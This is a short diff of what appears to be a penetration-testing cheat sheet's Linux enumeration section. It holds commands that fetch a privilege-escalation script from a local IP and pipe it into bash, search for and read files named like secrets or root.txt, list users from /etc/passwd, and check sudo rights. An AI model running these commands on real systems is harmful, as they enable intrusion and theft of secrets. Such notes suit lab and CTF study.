@@ -390,7 +390,7 @@ curl 192.168.214.128/linux/linpeas.sh | bash
 
 ## Linux
 [*] Enumeration
-find / -name '*secret0*' -readable 2>/dev/null | xargs cat
+find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
 find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
 cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
 sudo -l
